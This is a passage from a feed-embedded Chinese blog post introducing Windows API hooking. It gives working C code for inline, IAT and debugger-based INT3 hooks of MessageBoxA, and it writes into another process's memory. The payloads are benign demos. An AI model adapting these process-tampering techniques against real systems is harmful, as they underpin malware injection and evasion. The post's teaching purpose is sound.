operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"MessageBoxA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> PBYTE beginAddr <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>procAddr <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">;</span> DWORD originFlags <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> beginAddr<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>originFlags<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> beginAddr<span class="token punctuation">,</span> originOpcode<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> originFlags<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> WINAPI <span class="token function">Hook</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> LPCSTR lpText<span class="token punctuation">,</span> LPCSTR lpCaption<span class="token punctuation">,</span> UINT uType<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">typedef</span> <span class="token keyword">int</span> <span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> MessageBoxA_t<span class="token punctuation">)</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> LPCSTR lpText<span class="token punctuation">,</span> LPCSTR lpCaption<span class="token punctuation">,</span> UINT uType<span class="token punctuation">)</span><span class="token punctuation">;</span> PROC procAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"MessageBoxA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> PBYTE endAddr <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>procAddr <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span> MessageBoxA_t HookMessageBoxA <span class="token operator">=</span> <span class="token punctuation">(</span>MessageBoxA_t<span class="token punctuation">)</span>endAddr<span class="token punctuation">;</span> <span class="token function">HookMessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"Hooked!"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-2-IAT-Hook"><a href="#4-2-IAT-Hook" class="headerlink" title="4.2 IAT Hook"></a>4.2 IAT Hook</h3><p>此方法是修改加载到内存中的PE结构中的IAT表，此时IAT表存储的已经是函数的地址了，我们只需要遍历IAT，找到要Hook的DLL中对应的API函数地址然后进行修改即可。此时并不会修改DLL中的IAT，所以原有的API函数依然可以正常使用。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_CRT_SECURE_NO_WARNINGS</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span><span class="token keyword">void</span> <span class="token function">InstallHook</span><span class="token punctuation">(</span>LPCSTR DLLName<span class="token punctuation">,</span> PROC procAddr<span class="token punctuation">,</span> PROC hookAddr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> WINAPI <span class="token function">Hook</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> LPCSTR lpText<span class="token punctuation">,</span> LPCSTR lpCaption<span class="token punctuation">,</span> UINT uType<span class="token punctuation">)</span><span class="token punctuation">;</span>BOOL WINAPI <span class="token function">DllMain</span><span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span> DWORD  fdwReason<span class="token punctuation">,</span> LPVOID lpReserved<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    PROC procAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"MessageBoxA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    PROC hookAddr <span class="token operator">=</span> <span class="token punctuation">(</span>PROC<span class="token punctuation">)</span>Hook<span class="token punctuation">;</span> <span class="token keyword">switch</span> <span class="token punctuation">(</span>fdwReason<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">case</span> DLL_PROCESS_ATTACH<span class="token operator">:</span>        <span class="token function">InstallHook</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> hookAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"InstallHook!"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> DLL_PROCESS_DETACH<span class="token operator">:</span>        <span class="token function">InstallHook</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">,</span> hookAddr<span class="token punctuation">,</span> procAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">InstallHook</span><span class="token punctuation">(</span>LPCSTR DLLName<span class="token punctuation">,</span> PROC procAddr<span class="token punctuation">,</span> PROC hookAddr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> HMODULE hModule <span class="token operator">=</span> <span class="token function">GetModuleHandle</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 解析PE</span> PIMAGE_DOS_HEADER pDosHeader <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>hModule<span class="token punctuation">;</span> PIMAGE_NT_HEADERS pNtHeader <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>SIZE_T<span class="token punctuation">)</span>hModule <span class="token operator">+</span> pDosHeader<span class="token operator">-></span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span> DWORD szImageBase <span class="token operator">=</span> pNtHeader<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>ImageBase<span class="token punctuation">;</span> DWORD szImpRva <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>pNtHeader<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>DataDirectory<span class="token punctuation">[</span>IMAGE_DIRECTORY_ENTRY_IMPORT<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">;</span> PIMAGE_IMPORT_DESCRIPTOR pImpDes <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">)</span><span class="token punctuation">(</span>szImageBase <span class="token operator">+</span> szImpRva<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 变量导入表</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>pImpDes<span class="token operator">-></span>Name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        DWORD szNameAddr <span class="token operator">=</span> szImageBase <span class="token operator">+</span> pImpDes<span class="token operator">-></span>Name<span class="token punctuation">;</span>        <span class="token keyword">char</span> szName<span class="token punctuation">[</span>MAXBYTE<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token function">strcpy_s</span><span class="token punctuation">(</span>szName<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>szNameAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token function">_strlwr</span><span class="token punctuation">(</span>szName<span class="token punctuation">)</span><span class="token punctuation">,</span> DLLName<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            PIMAGE_THUNK_DATA pThunk <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_THUNK_DATA<span class="token punctuation">)</span><span class="token punctuation">(</span>pImpDes<span class="token operator">-></span>FirstThunk <span class="token operator">+</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>hModule<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>pThunk<span class="token operator">-></span>u1<span class="token punctuation">.</span>Function<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>pThunk<span class="token operator">-></span>u1<span class="token punctuation">.</span>Function <span class="token operator">==</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>procAddr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">//修改访问权限</span>                    DWORD dwOldProtect<span class="token punctuation">;</span>                    <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token operator">&amp;</span>pThunk<span class="token operator">-></span>u1<span class="token punctuation">.</span>Function<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOldProtect<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">//修改IAT</span>                    pThunk<span class="token operator">-></span>u1<span class="token punctuation">.</span>Function <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>hookAddr<span class="token punctuation">;</span>                    <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span><span class="token operator">&amp;</span>pThunk<span class="token operator">-></span>u1<span class="token punctuation">.</span>Function<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> dwOldProtect<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                pThunk<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        pImpDes<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> WINAPI <span class="token function">Hook</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> LPCSTR lpText<span class="token punctuation">,</span> LPCSTR lpCaption<span class="token punctuation">,</span> UINT uType<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"Hooked!"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-3-Debug-Hook"><a href="#4-3-Debug-Hook" class="headerlink" title="4.3 Debug Hook"></a>4.3 Debug Hook</h3><p>使用Win32 API 实现一个简单的调试器，在API 函数地址处构造INT3断点，中断后调用Hook函数。感觉没啥太大意义。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>CREATE_PROCESS_DEBUG_INFO g_cpdi<span class="token punctuation">;</span>BYTE originOpcode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>BYTE intOpcode <span class="token operator">=</span> <span class="token number">0xCC</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">InstallHook</span><span class="token punctuation">(</span>PROC procAddr<span class="token punctuation">,</span> LPDEBUG_EVENT pde<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">UninstallHook</span><span class="token punctuation">(</span>PROC procAddr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">Hook</span><span class="token punctuation">(</span>PROC procAddr<span class="token punctuation">,</span> LPDEBUG_EVENT pde<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">DebugLoop</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">DebugActiveProcess</span><span class="token punctuation">(</span><span class="token number">27464</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">DebugLoop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">InstallHook</span><span class="token punctuation">(</span>PROC procAddr<span class="token punctuation">,</span> LPDEBUG_EVENT pde<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>g_cpdi<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pde<span class="token operator">-></span>u<span class="token punctuation">.</span>CreateProcessInfo<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CREATE_PROCESS_DEBUG_INFO<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>g_cpdi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>originOpcode<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>BYTE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>g_cpdi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>intOpcode<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>BYTE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] 已添加断点！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">UninstallHook</span><span class="token punctuation">(</span>PROC procAddr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>g_cpdi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>originOpcode<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>BYTE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] 已取消断点！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">Hook</span><span class="token punctuation">(</span>PROC procAddr<span class="token punctuation">,</span> LPDEBUG_EVENT pde<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    PEXCEPTION_RECORD per <span class="token operator">=</span> <span class="token operator">&amp;</span>pde<span class="token operator">-></span>u<span class="token punctuation">.</span>Exception<span class="token punctuation">.</span>ExceptionRecord<span class="token punctuation">;</span>    CONTEXT ctx<span class="token punctuation">;</span>    SIZE_T titleAddr<span class="token punctuation">;</span>    <span class="token keyword">char</span> title<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Hooked"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>per<span class="token operator">-></span>ExceptionCode <span class="token operator">==</span> EXCEPTION_BREAKPOINT<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>per<span class="token operator">-></span>ExceptionAddress <span class="token operator">==</span> procAddr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] 程序已中断！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 1. 解除hook</span>            <span class="token function">UninstallHook</span><span class="token punctuation">(</span>procAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 2. 获取线程上下文</span>            ctx<span class="token punctuation">.</span>ContextFlags <span class="token operator">=</span> CONTEXT_CONTROL<span class="token punctuation">;</span>            <span class="token function">GetThreadContext</span><span class="token punctuation">(</span>g_cpdi<span class="token punctuation">.</span>hThread<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 3. 更改参数值</span>            <span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>g_cpdi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPCVOID<span class="token punctuation">)</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>Esp <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>titleAddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>SIZE_T<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//printf("[-] ESP地址：%ph\n", ctx.Esp);</span>            <span class="token comment">//printf("[-] MSG函数参数为：%x\n", &amp;titleAddr);</span>            DWORD dwOldProtect<span class="token punctuation">;</span>            <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span>g_cpdi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span>titleAddr<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOldProtect<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>g_cpdi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span>titleAddr<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span>title<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span>g_cpdi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span>titleAddr<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> dwOldProtect<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 4. 还原EIP指针</span>            ctx<span class="token punctuation">.</span>Eip <span class="token operator">=</span> <span class="token punctuation">(</span>SIZE_T<span class="token punctuation">)</span>procAddr<span class="token punctuation">;</span>            <span class="token function">SetThreadContext</span><span class="token punctuation">(</span>g_cpdi<span class="token punctuation">.</span>hThread<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 5. 恢复运行进程</span>            <span class="token function">ContinueDebugEvent</span><span class="token punctuation">(</span>pde<span class="token operator">-></span>dwProcessId<span class="token punctuation">,</span> pde<span class="token operator">-></span>dwThreadId<span class="token punctuation">,</span> DBG_CONTINUE<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 6. Hook</span>            <span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>g_cpdi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>intOpcode<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>BYTE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">DebugLoop</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    PROC procAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">LoadLibraryA</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"MessageBoxA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] 已附加到程序！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Hook API地址：%ph\n"</span><span class="token punctuation">,</span> procAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>    DEBUG_EVENT de<span class="token punctuation">;</span>     <span class="token comment">//调试事件</span>    <span class="token comment">//等待调试事件的发生</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">WaitForDebugEvent</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>de<span class="token punctuation">,</span> INFINITE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//等待调试信息，收到调试信息立即返回进入循环</span>        <span class="token comment">// 被调试进程生成或附加事件,被调试进程启动或者附加时执行</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>CREATE_PROCESS_DEBUG_EVENT <span class="token operator">==</span> de<span class="token punctuation">.</span>dwDebugEventCode<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">InstallHook</span><span class="token punctuation">(</span>procAddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>de<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//异常事件调试，负责处理INT3中断事件</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>EXCEPTION_DEBUG_EVENT <span class="token operator">==</span> de<span class="token punctuation">.</span>dwDebugEventCode<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">Hook</span><span class="token punctuation">(</span>procAddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>de<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//被调试进程终止事件，进程中止后，调试器也结束</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>EXIT_PROCESS_DEBUG_EVENT <span class="token operator">==</span> de<span class="token punctuation">.</span>dwDebugEventCode<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//再次运行被调试者</span>        <span class="token function">ContinueDebugEvent</span><span class="token punctuation">(</span>de<span class="token punctuation">.</span>dwProcessId<span class="token punctuation">,</span> de<span class="token punctuation">.</span>dwThreadId<span class="token punctuation">,</span> DBG_CONTINUE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-写在最后"><a href="#5-写在最后" class="headerlink" title="5 写在最后"></a>5 写在最后</h2><p>这是一篇入门性质的文章，列举了Windows系统中的一些安全问题。我在写这篇文章之前惊奇的发现我做的这些实验竟然都在《逆向工程核心原理》一书中的前几章中提到了，所以就把这4部分放在一起做了总结。<br>第一篇文章，写的很仓促很潦草，如果有任何错误和遗漏恳请大家的指正和补充。</p><h2 id="6-参考"><a href="#6-参考" class="headerlink" title="6 参考"></a>6 参考</h2><ul><li><a href="https://github.com/Antonin-Deniau/cave_miner">https://github.com/Antonin-Deniau/cave_miner</a></li><li><a href="https://github.com/HackerajOfficial/injectAllTheThings">https://github.com/HackerajOfficial/injectAllTheThings</a></li><li><a href="https://github.com/ctxis/DLLHSC">https://github.com/ctxis/DLLHSC</a></li><li>kn0sky的博客：<a href="https://www.kn0sky.com/?p=31">https://www.kn0sky.com/?p=31</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-PE注入&quot;&gt;&lt;a href=&quot;#1-PE注入&quot; class=&quot;headerlink&quot; title=&quot;1 PE注入&quot;&gt;&lt;/a&gt;1 PE注入&lt;/h2&gt;&lt;p&gt;PE注入就是对静态的PE文件进行修改，使其在运行时能够加载我们需要的构造的代码。因为都是对文件进行静态的修改</summary>
      
    
    
    
    <category term="Windows" scheme="http://reop.cc/categories/Windows/"/>
    
    
  </entry>
  
</feed>
